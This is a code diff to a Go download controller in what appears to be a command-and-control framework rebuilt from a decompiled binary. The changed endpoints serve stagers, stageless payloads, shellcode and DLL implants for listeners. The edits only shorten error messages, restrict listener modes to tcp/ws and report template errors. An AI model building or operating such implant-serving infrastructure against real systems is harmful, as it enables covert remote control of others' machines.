@@ -63,12 +63,13 @@ func (c *DownloadController) Stage() {
 
 	l := c2engine.GetEngine().GetListener(int64(id))
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
 	// 模式校验：仅 tcp/ws（反编译 0x18dcd20 的 +0x48/+0x40 比较）。
+	// 黑盒：监听器模式不是 tcp/ws 时直接拒绝（http 也不例外）。
 	switch l.Mode {
-	case "tcp", "ws", "websocket", "http", "https":
+	case "tcp", "ws", "websocket":
 	default:
 		c.JsonErr("Stage support TCP/WS only")
 		return
@@ -97,7 +98,7 @@ func (c *DownloadController) Stageless() {
 
 	l := c2engine.GetEngine().GetListener(id)
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
 
@@ -133,7 +134,7 @@ func (c *DownloadController) Listen() {
 
 	l := c2engine.GetEngine().GetListener(id)
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
 
@@ -171,11 +172,12 @@ func (c *DownloadController) Shellcode() {
 
 	l := c2engine.GetEngine().GetListener(id)
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
+	// 黑盒：监听器模式不是 tcp/ws 时直接拒绝（http 也不例外）。
 	switch l.Mode {
-	case "tcp", "ws", "websocket", "http", "https":
+	case "tcp", "ws", "websocket":
 	default:
 		c.JsonErr("Stage support TCP/WS only")
 		return
@@ -204,7 +206,7 @@ func (c *DownloadController) Dll() {
 
 	l := c2engine.GetEngine().GetListener(id)
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
 
@@ -244,7 +246,7 @@ func (c *DownloadController) ListenDll() {
 
 	l := c2engine.GetEngine().GetListener(id)
 	if l == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
 		return
 	}
 
@@ -270,7 +272,13 @@ func (c *DownloadController) ListenDll() {
 // Expires / Pragma headers set by FUN_00c28a40.
 func (c *DownloadController) servePoDownload(p *c2engine.PoPayload) {
 	if p == nil {
-		c.JsonErr("listener not found")
+		c.JsonErr("not found")
+		return
+	}
+	// 模板缺失/修补失败：原版把 os 错误原样回给面板，
+	// 例如 "open stageless/http_windows_amd64: file does not exist"。
+	if p.Err != nil {
+		c.JsonErr(p.Err.Error())
 		return
 	}
 
